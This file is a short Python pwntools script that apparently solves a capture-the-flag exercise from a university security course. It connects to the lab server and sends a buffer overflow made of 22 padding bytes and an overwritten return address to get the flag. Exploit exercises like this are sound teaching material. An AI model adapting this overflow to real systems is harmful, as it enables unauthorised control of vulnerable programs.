from pwn import remote, p32

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23154

remote = remote(SERVER, PORT, timeout=10000)

buffer = b"a" * 22 + p32(0x080486f1)

remote.recvline()
remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof{")
print(flag.decode().split()[-1])